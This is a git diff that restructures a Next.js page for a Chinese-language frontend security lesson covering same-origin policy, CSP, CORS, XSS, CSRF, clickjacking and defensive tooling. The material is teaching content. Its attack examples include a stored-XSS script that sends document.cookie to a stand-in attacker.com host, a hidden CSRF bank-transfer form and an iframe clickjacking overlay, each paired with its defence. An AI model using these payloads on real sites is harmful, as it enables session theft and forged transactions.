@@ -1,112 +1,37 @@
-"use client";
-import { useState } from "react";
-import Link from "next/link";
+'use client'
 
-export default function FrontendSecurityBasicPage() {
-  const [activeTab, setActiveTab] = useState("overview");
+import LessonLayout, { type LessonMeta } from '@/app/components/ui/book/LessonLayout'
+import { THEMES } from '@/app/components/ui/book/theme'
+import {
+  PageTitle, SectionTitle, BookParagraph, BookCode, BookAlert, BookList,
+} from '@/app/components/ui/book/BookContent'
 
-  return (
-    <div className="container mx-auto px-4 py-8">
-      <h1 className="text-3xl font-bold mb-8">前端安全基础</h1>
-      
-      {/* 标签页导航 */}
-      <div className="flex space-x-4 mb-6 border-b overflow-x-auto">
-        <button
-          onClick={() => setActiveTab("overview")}
-          className={`px-4 py-2 font-medium whitespace-nowrap ${
-            activeTab === "overview"
-              ? "border-b-2 border-blue-500 text-blue-600"
-              : "text-gray-500 hover:text-gray-700"
-          }`}
-        >
-          安全概述
-        </button>
-        <button
-          onClick={() => setActiveTab("attacks")}
-          className={`px-4 py-2 font-medium whitespace-nowrap ${
-            activeTab === "attacks"
-              ? "border-b-2 border-blue-500 text-blue-600"
-              : "text-gray-500 hover:text-gray-700"
-          }`}
-        >
-          攻击类型
-        </button>
-        <button
-          onClick={() => setActiveTab("defense")}
-          className={`px-4 py-2 font-medium whitespace-nowrap ${
-            activeTab === "defense"
-              ? "border-b-2 border-blue-500 text-blue-600"
-              : "text-gray-500 hover:text-gray-700"
-          }`}
-        >
-          防御方案
-        </button>
-        <button
-          onClick={() => setActiveTab("tools")}
-          className={`px-4 py-2 font-medium whitespace-nowrap ${
-            activeTab === "tools"
-              ? "border-b-2 border-blue-500 text-blue-600"
-              : "text-gray-500 hover:text-gray-700"
-          }`}
-        >
-          安全工具
-        </button>
-      </div>
+const META: LessonMeta = {
+  subject: '网络安全',
+  chapterTitle: '前端安全基础',
+  chapterNumber: 1,
+  totalChapters: 10,
+  subjectHref: '/study/security/frontend',
+  prevChapter: { label: '密码学应用', href: '/study/security/crypto/application' },
+  nextChapter: { label: 'XSS攻击防护', href: '/study/security/frontend/xss' },
+  theme: THEMES.security,
+}
 
-      {/* 内容区域 */}
-      <div className="bg-white rounded-lg shadow-md p-6">
-        {activeTab === "overview" && (
-          <div className="space-y-6">
-            <h3 className="text-xl font-semibold mb-3">前端安全概述</h3>
-            <div className="prose max-w-none">
-              <h4 className="font-semibold">1. 前端安全的重要性</h4>
-              <p className="mb-4">
-                前端安全是Web应用安全的第一道防线。随着Web应用的复杂性增加，前端面临的安全威胁也越来越多。前端安全不仅关系到用户体验，更关系到整个应用的安全性。
-              </p>
-
-              <h4 className="font-semibold">2. 前端安全的核心概念</h4>
-              <div className="bg-gray-100 p-4 rounded-lg mb-4">
-                <h5 className="font-semibold mb-2">同源策略（Same-Origin Policy）</h5>
-                <p className="mb-2">
-                  同源策略是浏览器最基本的安全机制，它限制了来自不同源的文档或脚本之间的交互。同源的定义包括：
-                </p>
-                <ul className="list-disc pl-6 mb-4">
-                  <li>协议相同（http/https）</li>
-                  <li>域名相同</li>
-                  <li>端口相同</li>
-                </ul>
-                <pre className="bg-gray-200 p-2 rounded">
-                  <code>{`// 同源示例
+const sameOriginCode = `// 同源示例
 http://example.com/page1.html 和 http://example.com/page2.html 是同源
 http://example.com 和 https://example.com 不是同源
 http://example.com 和 http://api.example.com 不是同源
-http://example.com:80 和 http://example.com:8080 不是同源`}</code>
-                </pre>
-              </div>
+http://example.com:80 和 http://example.com:8080 不是同源`
 
-              <div className="bg-gray-100 p-4 rounded-lg mb-4">
-                <h5 className="font-semibold mb-2">内容安全策略（CSP）</h5>
-                <p className="mb-2">
-                  CSP是一个额外的安全层，用于检测和减轻某些类型的攻击，如XSS和数据注入攻击。它通过指定允许加载的资源类型和来源来实现。
-                </p>
-                <pre className="bg-gray-200 p-2 rounded">
-                  <code>{`// CSP配置示例
-Content-Security-Policy: 
+const cspCode = `// CSP配置示例
+Content-Security-Policy:
   default-src 'self';  // 只允许从同源加载资源
   script-src 'self' https://trusted-cdn.com;  // 允许从指定CDN加载脚本
   style-src 'self' 'unsafe-inline';  // 允许内联样式
   img-src 'self' data: https:;  // 允许从同源、data URL和HTTPS加载图片
-  connect-src 'self' https://api.example.com;  // 允许向指定API发送请求`}</code>
-                </pre>
-              </div>
+  connect-src 'self' https://api.example.com;  // 允许向指定API发送请求`
 
-              <div className="bg-gray-100 p-4 rounded-lg mb-4">
-                <h5 className="font-semibold mb-2">跨域资源共享（CORS）</h5>
-                <p className="mb-2">
-                  CORS是一种机制，允许Web应用服务器进行跨域访问控制，从而使跨域数据传输得以安全进行。
-                </p>
-                <pre className="bg-gray-200 p-2 rounded">
-                  <code>{`// 服务器端CORS配置示例（Node.js/Express）
+const corsCode = `// 服务器端CORS配置示例（Node.js/Express）
 app.use(cors({
   origin: 'https://trusted-site.com',  // 允许的源
   methods: ['GET', 'POST'],  // 允许的HTTP方法
@@ -123,14 +48,9 @@ fetch('https://api.example.com/data', {
     'Content-Type': 'application/json'
   },
   body: JSON.stringify({ data: 'example' })
-});`}</code>
-                </pre>
-              </div>
+});`
 
-              <h4 className="font-semibold">3. 前端安全最佳实践</h4>
-              <div className="bg-gray-100 p-4 rounded-lg">
-                <pre className="text-sm">
-                  <code>{`// 1. 输入验证
+const bestPracticeCode = `// 1. 输入验证
 function validateInput(input) {
   // 使用正则表达式验证输入
   const pattern = /^[a-zA-Z0-9]+$/;
@@ -156,22 +76,9 @@ const encryptedData = CryptoJS.AES.encrypt(
   JSON.stringify(sensitiveData),
   secretKey
 ).toString();
-localStorage.setItem('encryptedData', encryptedData);`}</code>
-                </pre>
-              </div>
-            </div>
-          </div>
-        )}
+localStorage.setItem('encryptedData', encryptedData);`
 
-        {activeTab === "attacks" && (
-          <div className="space-y-6">
-            <h3 className="text-xl font-semibold mb-3">常见攻击类型</h3>
-            <div className="prose max-w-none">
-              <h4 className="font-semibold">1. XSS（跨站脚本）攻击</h4>
-              <div className="bg-gray-100 p-4 rounded-lg mb-4">
-                <h5 className="font-semibold mb-2">存储型XSS</h5>
-                <pre className="bg-gray-200 p-2 rounded">
-                  <code>{`// 攻击示例：在评论中注入恶意脚本
+const xssCode = `// 攻击示例：在评论中注入恶意脚本
 const comment = '<script>fetch("https://attacker.com/steal?cookie=" + document.cookie)</script>';
 
 // 防御示例：使用DOMPurify库净化输入
@@ -183,14 +90,9 @@ function sanitizeInput(input) {
 
 // 使用示例
 const safeComment = sanitizeInput(comment);
-document.getElementById('comments').innerHTML = safeComment;`}</code>
-                </pre>
-              </div>
+document.getElementById('comments').innerHTML = safeComment;`
 
-              <div className="bg-gray-100 p-4 rounded-lg mb-4">
-                <h5 className="font-semibold mb-2">反射型XSS</h5>
-                <pre className="bg-gray-200 p-2 rounded">
-                  <code>{`// 攻击示例：通过URL参数注入脚本
+const reflectedXssCode = `// 攻击示例：通过URL参数注入脚本
 // 恶意URL: https://example.com/search?q=<script>alert('XSS')</script>
 
 // 防御示例：使用encodeURIComponent编码URL参数
@@ -201,14 +103,9 @@ function handleSearch(query) {
 }
 
 // 使用示例
-handleSearch('<script>alert("XSS")</script>');`}</code>
-                </pre>
-              </div>
+handleSearch('<script>alert("XSS")</script>');`
 
-              <h4 className="font-semibold">2. CSRF（跨站请求伪造）攻击</h4>
-              <div className="bg-gray-100 p-4 rounded-lg mb-4">
-                <pre className="bg-gray-200 p-2 rounded">
-                  <code>{`// 攻击示例：伪造转账请求
+const csrfCode = `// 攻击示例：伪造转账请求
 <form action="https://bank.com/transfer" method="POST" id="csrf-form">
   <input type="hidden" name="amount" value="1000">
   <input type="hidden" name="to" value="attacker">
@@ -233,28 +130,16 @@ async function makeRequest() {
     })
   });
   // 处理响应...
-}`}</code>
-                </pre>
-              </div>
+}`
 
-              <h4 className="font-semibold">3. 点击劫持（Clickjacking）</h4>
-              <div className="bg-gray-100 p-4 rounded-lg mb-4">
-                <pre className="bg-gray-200 p-2 rounded">
-                  <code>{`// 攻击示例：使用iframe覆盖目标网站
+const clickjackingCode = `// 攻击示例：使用iframe覆盖目标网站
 <style>
   .overlay {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    z-index: 1;
+    position: fixed; top: 0; left: 0;
+    width: 100%; height: 100%; z-index: 1;
   }
   .target {
-    position: absolute;
-    top: 100px;
-    left: 100px;
-    z-index: 0;
+    position: absolute; top: 100px; left: 100px; z-index: 0;
   }
 </style>
 <div class="overlay">
@@ -266,21 +151,9 @@ async function makeRequest() {
 // 服务器端设置
 res.setHeader('X-Frame-Options', 'DENY');
 // 或使用Content-Security-Policy
-res.setHeader('Content-Security-Policy', "frame-ancestors 'none'");`}</code>
-                </pre>
-              </div>
-            </div>
-          </div>
-        )}
+res.setHeader('Content-Security-Policy', "frame-ancestors 'none'");`
 
-        {activeTab === "defense" && (
-          <div className="space-y-6">
-            <h3 className="text-xl font-semibold mb-3">防御方案</h3>
-            <div className="prose max-w-none">
-              <h4 className="font-semibold">1. 输入验证和过滤</h4>
-              <div className="bg-gray-100 p-4 rounded-lg mb-4">
-                <pre className="bg-gray-200 p-2 rounded">
-                  <code>{`// 1. 使用正则表达式验证
+const inputValidationCode = `// 1. 使用正则表达式验证
 function validateEmail(email) {
   const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
   return emailRegex.test(email);
@@ -307,19 +180,12 @@ function sanitizeHtml(dirty) {
 }
 
 // 4. 使用Content Security Policy
-// 在HTML中设置
-<meta http-equiv="Content-Security-Policy" 
-  content="default-src 'self'; 
-           script-src 'self' https://trusted-cdn.com; 
-           style-src 'self' 'unsafe-inline';">
-`}</code>
-                </pre>
-              </div>
+<meta http-equiv="Content-Security-Policy"
+  content="default-src 'self';
+           script-src 'self' https://trusted-cdn.com;
+           style-src 'self' 'unsafe-inline';">`
 
-              <h4 className="font-semibold">2. 安全的Cookie设置</h4>
-              <div className="bg-gray-100 p-4 rounded-lg mb-4">
-                <pre className="bg-gray-200 p-2 rounded">
-                  <code>{`// 1. 设置安全的Cookie
+const cookieCode = `// 1. 设置安全的Cookie
 document.cookie = "sessionId=123; Secure; HttpOnly; SameSite=Strict";
 
 // 2. 使用Cookie属性
@@ -327,25 +193,19 @@ const cookieOptions = {
   secure: true,      // 只通过HTTPS发送
   httpOnly: true,    // 防止JavaScript访问
   sameSite: 'Strict', // 防止CSRF攻击
-  path: '/',         // Cookie的路径
-  domain: 'example.com', // Cookie的域名
-  maxAge: 3600       // Cookie的过期时间（秒）
+  path: '/',
+  domain: 'example.com',
+  maxAge: 3600
 };
 
 // 3. 使用Cookie库
 import Cookies from 'js-cookie';
-
 Cookies.set('sessionId', '123', {
   secure: true,
   sameSite: 'strict'
-});`}</code>
-                </pre>
-              </div>
+});`
 
-              <h4 className="font-semibold">3. 安全的API调用</h4>
-              <div className="bg-gray-100 p-4 rounded-lg mb-4">
-                <pre className="bg-gray-200 p-2 rounded">
-                  <code>{`// 1. 使用Fetch API的安全配置
+const secureApiCode = `// 1. 使用Fetch API的安全配置
 async function secureFetch(url, options = {}) {
   const defaultOptions = {
     credentials: 'same-origin',
@@ -381,7 +241,6 @@ const api = axios.create({
 
 // 添加请求拦截器
 api.interceptors.request.use(config => {
-  // 添加CSRF Token
   const token = document.querySelector('meta[name="csrf-token"]').content;
   config.headers['X-CSRF-Token'] = token;
   return config;
@@ -392,34 +251,13 @@ api.interceptors.response.use(
   response => response,
   error => {
     if (error.response.status === 401) {
-      // 处理未授权错误
       window.location.href = '/login';
     }
     return Promise.reject(error);
   }
-);`}</code>
-                </pre>
-              </div>
-            </div>
-          </div>
-        )}
+);`
 
-        {activeTab === "tools" && (
-          <div className="space-y-6">
-            <h3 className="text-xl font-semibold mb-3">安全工具</h3>
-            <div className="prose max-w-none">
-              <h4 className="font-semibold">1. 安全扫描工具</h4>
-              <ul className="list-disc pl-6 mb-4">
-                <li>OWASP ZAP：Web应用安全扫描器</li>
-                <li>Burp Suite：Web应用安全测试工具</li>
-                <li>Acunetix：自动化Web漏洞扫描器</li>
-                <li>SonarQube：代码质量与安全分析工具</li>
-              </ul>
-
-              <h4 className="font-semibold">2. 开发工具</h4>
-              <div className="bg-gray-100 p-4 rounded-lg mb-4">
-                <pre className="bg-gray-200 p-2 rounded">
-                  <code>{`// 1. 使用ESLint安全规则
+const eslintConfigCode = `// 1. 使用ESLint安全规则
 // .eslintrc.js
 module.exports = {
   extends: [
@@ -438,37 +276,18 @@ module.exports = {
 // package.json
 {
   "dependencies": {
-    "helmet": "^4.6.0",        // Express安全中间件
-    "cors": "^2.8.5",          // CORS中间件
-    "express-rate-limit": "^5.3.0",  // 请求限制
-    "express-validator": "^6.12.0",  // 输入验证
-    "jsonwebtoken": "^8.5.1",   // JWT认证
-    "bcryptjs": "^2.4.3",      // 密码哈希
-    "cookie-parser": "^1.4.5",  // Cookie解析
-    "csurf": "^1.11.0"         // CSRF保护
+    "helmet": "^4.6.0",
+    "cors": "^2.8.5",
+    "express-rate-limit": "^5.3.0",
+    "express-validator": "^6.12.0",
+    "jsonwebtoken": "^8.5.1",
+    "bcryptjs": "^2.4.3",
+    "cookie-parser": "^1.4.5",
+    "csurf": "^1.11.0"
   }
-}
+}`
 
-// 3. 使用安全相关的浏览器扩展
-// - HTTPS Everywhere
-// - uBlock Origin
-// - Privacy Badger
-// - NoScript`}</code>
-                </pre>
-              </div>
-
-              <h4 className="font-semibold">3. 监控工具</h4>
-              <ul className="list-disc pl-6 mb-4">
-                <li>Sentry：错误监控和性能监控</li>
-                <li>New Relic：应用性能监控</li>
-                <li>Datadog：基础设施监控</li>
-                <li>LogRocket：用户会话回放</li>
-              </ul>
-
-              <h4 className="font-semibold">4. 安全配置示例</h4>
-              <div className="bg-gray-100 p-4 rounded-lg">
-                <pre className="bg-gray-200 p-2 rounded">
-                  <code>{`// 1. Express安全配置
+const expressConfigCode = `// 1. Express安全配置
 import express from 'express';
 import helmet from 'helmet';
 import cors from 'cors';
@@ -490,13 +309,12 @@ app.use(cors({
 // 配置请求限制
 const limiter = rateLimit({
   windowMs: 15 * 60 * 1000, // 15分钟
-  max: 100 // 限制每个IP 15分钟内最多100个请求
+  max: 100
 });
 app.use(limiter);
 
 // 2. 安全中间件
 const securityMiddleware = (req, res, next) => {
-  // 设置安全头
   res.setHeader('X-Content-Type-Options', 'nosniff');
   res.setHeader('X-Frame-Options', 'DENY');
   res.setHeader('X-XSS-Protection', '1; mode=block');
@@ -516,30 +334,106 @@ app.post('/api/user', [
   if (!errors.isEmpty()) {
     return res.status(400).json({ errors: errors.array() });
   }
-  // 处理请求...
-});`}</code>
-                </pre>
-              </div>
-            </div>
-          </div>
-        )}
-      </div>
+});`
 
-      {/* 底部导航 */}
-      <div className="mt-8 flex justify-between">
-        <Link
-          href="/study/security/crypto/application"
-          className="px-4 py-2 text-blue-600 hover:text-blue-800"
-        >
-          ← 密码学应用
-        </Link>
-        <Link
-          href="/study/security/frontend/xss"
-          className="px-4 py-2 text-blue-600 hover:text-blue-800"
-        >
-          XSS攻击防护 →
-        </Link>
+const SPREADS = [
+  {
+    label: '安全概述',
+    left: (
+      <div className="space-y-4">
+        <PageTitle>前端安全概述</PageTitle>
+        <SectionTitle>1. 前端安全的重要性</SectionTitle>
+        <BookParagraph>
+          前端安全是Web应用安全的第一道防线。随着Web应用的复杂性增加，前端面临的安全威胁也越来越多。前端安全不仅关系到用户体验，更关系到整个应用的安全性。
+        </BookParagraph>
+        <SectionTitle>2. 同源策略（Same-Origin Policy）</SectionTitle>
+        <BookParagraph>
+          同源策略是浏览器最基本的安全机制，它限制了来自不同源的文档或脚本之间的交互。同源的定义包括：协议相同、域名相同、端口相同。
+        </BookParagraph>
+        <BookCode language="javascript" code={sameOriginCode} />
       </div>
-    </div>
-  );
-} 
+    ),
+    right: (
+      <div className="space-y-4">
+        <SectionTitle>3. 内容安全策略（CSP）</SectionTitle>
+        <BookParagraph>CSP是一个额外的安全层，用于检测和减轻某些类型的攻击，如XSS和数据注入攻击。它通过指定允许加载的资源类型和来源来实现。</BookParagraph>
+        <BookCode language="javascript" code={cspCode} />
+        <SectionTitle>4. 跨域资源共享（CORS）</SectionTitle>
+        <BookParagraph>CORS是一种机制，允许Web应用服务器进行跨域访问控制，从而使跨域数据传输得以安全进行。</BookParagraph>
+        <BookCode language="javascript" code={corsCode} />
+      </div>
+    ),
+  },
+  {
+    label: '攻击类型',
+    left: (
+      <div className="space-y-4">
+        <PageTitle>常见攻击类型</PageTitle>
+        <SectionTitle>1. XSS攻击（存储型）</SectionTitle>
+        <BookCode language="javascript" code={xssCode} />
+        <SectionTitle>2. XSS攻击（反射型）</SectionTitle>
+        <BookCode language="javascript" code={reflectedXssCode} />
+      </div>
+    ),
+    right: (
+      <div className="space-y-4">
+        <SectionTitle>3. CSRF攻击</SectionTitle>
+        <BookCode language="javascript" code={csrfCode} />
+        <SectionTitle>4. 点击劫持（Clickjacking）</SectionTitle>
+        <BookCode language="javascript" code={clickjackingCode} />
+      </div>
+    ),
+  },
+  {
+    label: '防御方案',
+    left: (
+      <div className="space-y-4">
+        <PageTitle>防御方案</PageTitle>
+        <SectionTitle>1. 输入验证和过滤</SectionTitle>
+        <BookCode language="javascript" code={inputValidationCode} />
+        <SectionTitle>2. 安全的Cookie设置</SectionTitle>
+        <BookCode language="javascript" code={cookieCode} />
+      </div>
+    ),
+    right: (
+      <div className="space-y-4">
+        <SectionTitle>3. 安全的API调用</SectionTitle>
+        <BookCode language="javascript" code={secureApiCode} />
+      </div>
+    ),
+  },
+  {
+    label: '安全工具',
+    left: (
+      <div className="space-y-4">
+        <PageTitle>安全工具</PageTitle>
+        <SectionTitle>1. 安全扫描工具</SectionTitle>
+        <BookList items={[
+          'OWASP ZAP：Web应用安全扫描器',
+          'Burp Suite：Web应用安全测试工具',
+          'Acunetix：自动化Web漏洞扫描器',
+          'SonarQube：代码质量与安全分析工具',
+        ]} />
+        <SectionTitle>2. 开发工具</SectionTitle>
+        <BookCode language="javascript" code={eslintConfigCode} />
+      </div>
+    ),
+    right: (
+      <div className="space-y-4">
+        <SectionTitle>3. 监控工具</SectionTitle>
+        <BookList items={[
+          'Sentry：错误监控和性能监控',
+          'New Relic：应用性能监控',
+          'Datadog：基础设施监控',
+          'LogRocket：用户会话回放',
+        ]} />
+        <SectionTitle>4. 安全配置示例</SectionTitle>
+        <BookCode language="javascript" code={expressConfigCode} />
+      </div>
+    ),
+  },
+]
+
+export default function FrontendSecurityBasicPage() {
+  return <LessonLayout meta={META} spreads={SPREADS} />
+}
